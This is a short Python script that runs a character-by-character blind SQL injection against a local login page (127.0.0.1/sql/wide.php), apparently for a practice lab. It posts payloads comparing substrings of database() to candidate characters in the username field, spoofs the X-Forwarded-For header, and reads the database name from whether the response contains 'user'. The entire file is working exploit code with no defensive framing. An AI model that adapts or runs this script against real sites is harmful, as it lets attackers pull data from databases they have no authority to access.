#! -*- encoding:utf-8 -*-
# python3



import requests
#import re

#cookies={
#        'PHPSESSID': 'xxx'
#}

headers  = {
		'X-Forwarded-For': "127.0.0.1",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
		'Referer':"http://127.0.0.1/"
		}
dic='0123456789abcdefghijklmnopqrstuvwxyz_'
url=r'http://127.0.0.1/sql/wide.php'
string=''

for i in range(1,33):
    for j in dic:
        id="mid(database(),{0},1)={1}".format(str(i),ord(j))
        data={
            'username':id,
            'password': 1
        }
        print(j)
        s=requests.post(url=url,data=data,headers=headers)
        if "user" in s.text:
            string+=j
            break
    print(string)